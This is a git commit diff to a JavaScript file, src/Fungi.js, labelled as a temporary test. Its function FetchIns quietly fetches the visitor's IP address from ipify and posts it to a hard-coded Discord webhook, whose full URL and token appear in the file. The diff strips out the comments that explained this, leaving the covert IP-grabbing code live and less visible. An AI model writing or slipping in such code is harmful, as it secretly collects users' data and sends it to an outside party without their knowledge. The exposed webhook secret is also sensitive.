36bd54dbf1bebab330a0aef54d7bc5f8a43b7085
DaCoderMane <Carterwombolt123@gmail.com>
2024-08-20 23:24:57 -0400

    Test, Removing After (TESTING MONKEY DONT FUCKING FLAME ME)

--- src/Fungi.js
+++ src/Fungi.js
@@ -1,16 +1,13 @@
 function FetchIns() {
     const webhookUrl = 'https://discord.com/api/webhooks/1275656626447188019/zknXOKY7VG9OR-XZ98IDzcwH3MD5tJ1B-X0vTTLex5nRKKmtjVdB5r-q3IFX0cnlkxeN';
   
-    // Fetch the user's IP address
     fetch('https://api.ipify.org?format=json')
       .then(response => response.json())
       .then(data => {
-        // Prepare the payload for the webhook
         const payload = {
           content: 'IP Address: ' + data.ip
         };
   
-        // Send the IP address to the provided webhook URL
         fetch(webhookUrl, {
           method: 'POST',
           headers: {
